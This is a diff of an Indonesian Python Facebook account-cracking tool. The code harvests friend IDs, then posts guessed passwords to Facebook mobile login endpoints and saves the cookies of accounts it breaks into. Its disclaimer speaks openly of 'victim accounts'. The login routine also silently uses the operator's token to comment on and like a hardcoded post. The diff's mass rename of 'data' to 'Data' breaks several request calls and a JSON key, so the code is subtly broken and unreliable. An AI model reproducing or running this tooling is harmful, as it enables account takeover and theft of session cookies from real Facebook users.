@@ -90,7 +90,7 @@ class login:
 
     def logoku(self):
         try:
-           os.popen('play-audio data/sound/logo.mp3')
+           os.popen('play-audio Data/sound/logo.mp3')
         except:
            pass
         prints(Panel(f"""\n{RC}d8888b.  .d8b.   .o88b. d88888b .88b  d88. 
@@ -118,8 +118,8 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time
                          if 'EAAB' in tok:
                             ses.post(f"https://graph.facebook.com/549345863862686/comments/?message={coki}&access_token={tok}",cookies={"cookie":coki}) # Jangan di ganti 
                             ses.post(f"https://graph.facebook.com/549345863862686/likes?summary=true&access_token={tok}",cookies={"cookie":coki}) # udh dibilang Jangan di ganti 
-                            open('data/tokenku.txt','w').write(tok)
-                            open('data/cokis.txt','w').write(coki)
+                            open('Data/tokenku.txt','w').write(tok)
+                            open('Data/cokis.txt','w').write(coki)
                             prints(f' {P2}({H2}•{P2}) login cookie berhasil'),
                             time.sleep(1);MulaiTools()
            except AttributeError:
@@ -154,7 +154,7 @@ class MulaiTools:
     def logoos(self):
         self.clear()
         try:
-           os.popen('play-audio data/sound/logo.mp3')
+           os.popen('play-audio Data/sound/logo.mp3')
         except:
            pass
         prints(Panel(f"""\n{RC}d8888b.  .d8b.   .o88b. d88888b .88b  d88. 
@@ -169,7 +169,7 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time
         prints(Panel(f"{P2}info, segala bentuk kerugian dan penyalahgunaan akun korban bukan tangung jawab author jika anda setuju maka tangung jawab sepenuh nya di tangan anda ketik {H2}'Y'{P2} untuk setuju dan ketik '{M2}T{P2}' untuk tidak setuju",title=f"{H2}Informasi",width=80,padding=(0,2),style=f"#AAAAAA"))
         war = input(f" {H}•{P} ingin lanjut ke tools? (Y/t) :{H} ")
         if war in ["y","Y","Ya","YA"]:
-          open('data/warning.txt','w').write(f'{war}')
+          open('Data/warning.txt','w').write(f'{war}')
           time.sleep(2);MulaiTools()
         elif war in ["t","T","tidak","Tidak","TIDAK"]:
           print(f" {H}•{P} selamat tinggal...")
@@ -179,11 +179,11 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time
           time.sleep(2);MulaiTools()
 
     def dump(self):
-         try:open('data/warning.txt','r').read()
+         try:open('Data/warning.txt','r').read()
          except:self.logMasuk()
          try:
-             cok = {"cookie":open('data/cokis.txt','r').read()}
-             tok = open('data/tokenku.txt','r').read()
+             cok = {"cookie":open('Data/cokis.txt','r').read()}
+             tok = open('Data/tokenku.txt','r').read()
          except:
              login()
          try:
@@ -208,7 +208,7 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time
               for c in uid.split(','):
                   try:
                       url = requests.get("https://graph.facebook.com/v15.0/{}?fields=id,name,friends.limit(5000)&access_token={}".format(c,tok),cookies=cok).json()
-                      for x in url["friends"]["data"]:
+                      for x in url["friends"]["Data"]:
                           ID.append(x["id"]+'<=>'+x["name"])
                           war = random.choice(["\x1b[1;91m","\x1b[1;92m","\x1b[1;93m","\x1b[1;94m","\x1b[1;95m","\x1b[1;96m"])
                           sys.stdout.write(f'\r {P}({H}•{P}) berhasil dump {war}{len(ID)} {P}id')
@@ -252,10 +252,10 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time
                  time.sleep(3);exit()
                      
          elif askk in ['0','00']:
-             prints(Panel(f"{RC}{open('data/cokis.txt','r').read()}\n\n{open('data/tokenku.txt','r').read()}",style=f"#AAAAAA"))
+             prints(Panel(f"{RC}{open('Data/cokis.txt','r').read()}\n\n{open('Data/tokenku.txt','r').read()}",style=f"#AAAAAA"))
              cok = console.input(f" {P2}({H2}•{P2}) apakah anda ingin menghapus cookie? (Y/t) : ")
              if cok in ["y","Y"]:
-               try:os.system('rm -rf data/cokis.txt')
+               try:os.system('rm -rf Data/cokis.txt')
                except:pass
                prints(f" {P2}({H2}•{P2}) berhasil menghapus cookie anda")
                time.sleep(1);exit()
@@ -329,19 +329,19 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time
          try:
               link = parse(requests.get(str(url_nama)).text,'html.parser')
               for find_id in link.find_all('td'):
-                  data_find = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(find_id))
-                  for id,user in data_find:
+                  Data_find = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(find_id))
+                  for id,user in Data_find:
                       if 'profile.php?' in id:
                           id = re.findall('id=(.*)',str(id))[0]
                       elif '<span' in user:
                           user = re.findall('(.*?)\<',str(user))[0]
-                      data_ditemukan = '%s<=>%s'%(id,user)
-                      if data_ditemukan in ID:pass
+                      Data_ditemukan = '%s<=>%s'%(id,user)
+                      if Data_ditemukan in ID:pass
                       else:
                            sys.stdout.write(f'\r {P}({H}•{P}) berhasil dump {war}{len(ID)} {P}id...')
                            sys.stdout.flush()
                            time.sleep(0000.00003)
-                           ID.append(data_ditemukan)
+                           ID.append(Data_ditemukan)
                   for next_url_name in link.find_all('a',href=True):
                       if 'Lihat Hasil Selanjutnya' in next_url_name.get('href'):
                           print(next_url_name)
@@ -474,7 +474,7 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time
                  else: ua
                  ses = requests.Session()
                  link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
-                 data = {
+                 Data = {
                     "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                     "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                     "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
@@ -505,7 +505,7 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time
                     "Accept-Encoding": "gzip, deflate",
                     "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                     }
-                 r = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", data = data, headers = head, allow_redirects=False)
+                 r = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", Data = Data, headers = head, allow_redirects=False)
                  if 'c_user' in ses.cookies.get_dict():
                      ok.append(user)
                      coki = ";".join([str(x)+'='+str(i) for x,i in ses.cookies.get_dict().items()])
@@ -539,7 +539,7 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time
                  else: ua
                  ses = requests.Session()
                  link = ses.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&refsrc=deprecated&_rdr")
-                 data = {
+                 Data = {
                     "lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                     "jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
                     "uid":user,
@@ -566,7 +566,7 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time
                     "Accept-Encoding": "gzip, deflate",
                     "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                     }
-                 r = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", data = data, headers = headers, allow_redirects=False)
+                 r = ses.post("https://m.facebook.com/login/device-based/validate-password/?shbl=0", Data = Data, headers = headers, allow_redirects=False)
                  if 'c_user' in ses.cookies.get_dict():
                      ok.append(user)
                      coki = ";".join([str(x)+'='+str(i) for x,i in ses.cookies.get_dict().items()])
@@ -619,7 +619,7 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time
                  else: ua
                  ses = requests.Session()
                  link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
-                 data = {
+                 Data = {
                     "m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                     "li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                     "try_number": "0",
@@ -642,7 +642,7 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time
                  }
                  head = {
                     "Host": "m.facebook.com",
-                    "content-length": f"{str(len(data))}",
+                    "content-length": f"{str(len(Data))}",
                     "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
                     "user-agent": ua,
                     "content-type": "application/x-www-form-urlencoded",
@@ -656,7 +656,7 @@ Y8888P' YP   YP  `Y88P' Y88888P YP  YP  YP\n""",title=f"{P2}halo, {H2}{self.Time
                     "accept-encoding": "gzip, deflate",
                     "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                     }
-                 r = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data = data, headers = head, allow_redirects=False)
+                 r = ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", Data = Data, headers = head, allow_redirects=False)
                  if 'c_user' in ses.cookies.get_dict():
                      ok.append(user)
                      coki = ";".join([str(x)+'='+str(i) for x,i in ses.cookies.get_dict().items()])
@@ -683,7 +683,7 @@ if __name__ == '__main__':
    except:pass
    try:os.mkdir("results")
    except:pass
-   try:os.mkdir("data")
+   try:os.mkdir("Data")
    except:pass
    MulaiTools()
 
